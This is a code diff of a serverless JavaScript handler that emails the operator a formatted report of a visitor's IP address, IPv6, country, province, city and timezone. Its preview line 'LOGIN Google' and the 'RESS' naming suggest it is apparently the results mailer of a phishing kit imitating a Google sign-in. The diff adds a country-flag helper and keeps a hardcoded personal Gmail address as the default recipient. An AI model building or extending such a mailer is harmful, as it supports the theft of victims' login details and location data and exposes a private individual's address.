@@ -4,12 +4,13 @@ export const config = {
     }
 };
 
-// Ambil setting dari config
-// Karena di Vercel serverless, kita simpan di file yang sama
-let SETTING = {
-    email: "medikaputra5@gmail.com",
-    nama: "RESS KENZO"
-};
+function countryFlag(code){
+    if (!code || code.length !== 2) return "";
+    const codePoints = code.toUpperCase().split("").map(function(c){
+        return 127397 + c.charCodeAt(0);
+    });
+    return String.fromCodePoint.apply(null, codePoints);
+}
 
 export default async function handler(req, res) {
 
@@ -44,9 +45,10 @@ export default async function handler(req, res) {
             return res.status(400).json({ error: "BODY_EMPTY" });
         }
 
-        // Ambil setting dari environment (fallback ke default)
         const NAMA  = process.env.RESS_NAME  || "RESS KENZO";
         const EMAIL = process.env.RESS_EMAIL || "medikaputra5@gmail.com";
+
+        const flag = countryFlag(d.negaraKode || "");
 
         const previewText = "ID | +62 | LOGIN Google | IP " + (d.ip || "-");
 
@@ -78,7 +80,7 @@ export default async function handler(req, res) {
       <table style="width:100%;font-size:14px;border-collapse:collapse">
         <tr><td style="padding:10px;font-weight:bold;width:35%">ALAMAT IP</td><td style="padding:10px">${d.ip || "-"}</td></tr>
         <tr style="background:#f9f9f9"><td style="padding:10px;font-weight:bold">IPV6</td><td style="padding:10px">${d.ipv6 || "-"}</td></tr>
-        <tr><td style="padding:10px;font-weight:bold">NEGARA</td><td style="padding:10px">${d.negara || "-"}</td></tr>
+        <tr><td style="padding:10px;font-weight:bold">NEGARA</td><td style="padding:10px">${flag} ${d.negara || "-"}</td></tr>
         <tr style="background:#f9f9f9"><td style="padding:10px;font-weight:bold">PROPINSI</td><td style="padding:10px">${d.prov || "-"}</td></tr>
         <tr><td style="padding:10px;font-weight:bold">KOTA</td><td style="padding:10px">${d.kota || "-"}</td></tr>
         <tr style="background:#f9f9f9"><td style="padding:10px;font-weight:bold">ZONA WAKTU</td><td style="padding:10px">${d.zona || "-"}</td></tr>
